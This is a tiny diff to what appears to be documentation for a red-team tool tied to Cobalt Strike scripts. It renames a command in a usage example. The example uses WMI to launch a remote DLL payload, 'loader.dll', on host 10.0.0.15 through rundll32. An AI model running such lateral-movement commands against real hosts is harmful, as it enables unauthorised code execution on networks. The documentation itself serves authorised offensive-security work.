@@ -8,7 +8,7 @@ CNA nor the BOF stages or removes it.
 
 ```text
 rex launchers
-rex WMIExec --target 10.0.0.15 --payload-type dll \
+rex wmi-exec --target 10.0.0.15 --payload-type dll \
   --remote-path C:\ProgramData\loader.dll \
   --launcher rundll32.exe --entry-point Run
 ```
